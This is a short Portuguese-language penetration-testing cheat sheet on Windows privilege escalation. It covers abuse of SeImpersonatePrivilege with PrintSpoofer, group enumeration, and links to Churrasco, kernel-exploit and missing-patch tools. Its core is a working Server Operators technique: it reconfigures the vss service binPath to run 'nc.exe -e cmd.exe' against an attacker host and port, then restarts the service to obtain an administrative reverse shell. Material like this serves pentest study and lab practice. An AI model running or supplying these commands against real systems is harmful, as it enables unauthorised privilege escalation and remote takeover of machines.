## Impersonation Privileges  
Verifique se o usuário possui a permissão **SeImpersonatePrivilege** com o comando `whoami /priv`. Caso esteja como enable, utilize o exploit **PrintSpoofer.exe**.  
Link: https://github.com/itm4n/PrintSpoofer/releases  

## Enumeração de grupos
Verifique quais grupos o usuário faz parte:
```powershell
net user <USER>
```
### Server Operators
O grupo `Server Operators` permite ao usuário parar e iniciar serviços.
Podemos utilizar o serviço `vss` para alterar indicar o caminho do binário que será executado e utilizar o `netcat` para enviar uma shell com privilégio administrativo.
```bash
# Copiar o binário nc.exe
cp /usr/share/windows-resources/binaries/nc.exe /tmp/nc.exe
```

```powershell
# Subir o binário para o alvo e indicar o caminho com o payload no serviço do vss
sc.exe config vss binPath="C:\System\Temp\nc.exe -e cmd.exe <LHOST> <LPORT>"

#Parar o serviço vss
sc.exe stop vss

# Iniciar o serviço com o payload malicioso
sc.exe start vss
```


# Windows Server 2003
Verificar se está vulnerável ao exploit Churrasco
https://www.exploit-db.com/exploits/6705

## Scripts para pesquisa de Kernels vulneráveis:
https://rootrecipe.medium.com/windows-kernel-exploitation-fe268f43bb35

## Pesquisa por patches não aplicados:
https://github.com/carlospolop/winPE/tree/master/binaries/watson

``